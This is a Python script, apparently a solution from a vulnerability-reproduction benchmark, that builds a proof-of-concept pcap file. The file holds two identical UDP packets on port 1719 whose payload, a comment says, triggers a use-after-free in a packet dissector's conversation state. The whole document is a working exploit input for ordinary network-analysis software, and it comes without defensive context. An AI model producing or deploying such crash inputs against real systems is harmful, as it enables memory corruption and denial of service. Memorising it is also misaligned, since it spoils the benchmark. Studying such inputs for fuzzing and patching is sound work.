import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        def create_pcap(packets_data: list[bytes], link_type: int) -> bytes:
            pcap_header = struct.pack(
                '<IHHIIII',
                0xa1b2c3d4,
                2, 4,
                0, 0,
                65535,
                link_type
            )
            
            records = b''
            for i, data in enumerate(packets_data):
                ts_sec = i
                ts_usec = 0
                incl_len = len(data)
                orig_len = len(data)
                
                rec_header = struct.pack(
                    '<IIII',
                    ts_sec, ts_usec,
                    incl_len, orig_len
                )
                records += rec_header + data
            
            return pcap_header + records

        def create_packet(payload: bytes) -> bytes:
            udp_len = 8 + len(payload)
            udp_header = struct.pack('!HHHH', 1719, 1719, udp_len, 0)

            ip_total_len = 20 + udp_len
            src_ip = b'\x7f\x00\x00\x01'
            dst_ip = b'\x7f\x00\x00\x01'
            
            ip_header_no_cksum = struct.pack(
                '!BBHHHBBH', 0x45, 0, ip_total_len, 1, 0x4000, 64, 17, 0
            ) + src_ip + dst_ip

            s = 0
            for i in range(0, len(ip_header_no_cksum), 2):
                s += (ip_header_no_cksum[i] << 8) + ip_header_no_cksum[i+1]
            
            s = (s >> 16) + (s & 0xffff)
            s += s >> 16
            s = ~s & 0xffff
            
            ip_header = struct.pack(
                '!BBHHHBB', 0x45, 0, ip_total_len, 1, 0x4000, 64, 17
            ) + struct.pack('!H', s) + src_ip + dst_ip

            return ip_header + udp_header + payload

        trigger_payload = b'\x03\x00\x00\xff'

        packet_data = create_packet(trigger_payload)
        
        # Two identical packets are needed. The first sets up a stale pointer
        # in the conversation state. The second uses that pointer, causing a UAF.
        poc = create_pcap([packet_data, packet_data], link_type=101)
        
        return poc